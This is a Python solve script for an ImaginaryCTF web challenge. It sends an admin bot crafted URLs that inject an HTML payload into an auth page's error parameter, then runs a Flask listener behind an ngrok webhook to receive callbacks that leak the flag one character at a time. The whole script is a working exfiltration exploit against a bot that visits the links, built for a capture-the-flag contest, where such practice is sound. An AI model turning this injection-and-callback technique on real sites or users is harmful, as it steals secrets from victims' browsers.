from pwn import *
import string
import urllib.parse
from flask import Flask, request
app = Flask(__name__)

WEBHOOK = "<INSERT_NGROK_URL>" # ngrok http 8080
WEBHOOK = WEBHOOK.replace("https:", "").replace("http:", "")

chars = [n for n in "abcdefghijklmnopqrstuvwxyz0123456789"]

@app.route("/")
def process():
  chars.remove(request.args["a"])
  if len(chars) == 1:
    print(chars)
  return ""

conn = remote("amogus-admin-bot.chal.imaginaryctf.org", 1337)
a = open("solve.html").read().replace("\n", "")
flag = "ictf{"
url = "http://auth.supersus.corp/?error="
for n in "abcdefghijklmnopqrstuvwxyz0123456789":
  url += urllib.parse.quote_plus(a % ((flag + n), WEBHOOK, n))
conn.sendline(url)
app.run(port=8080)
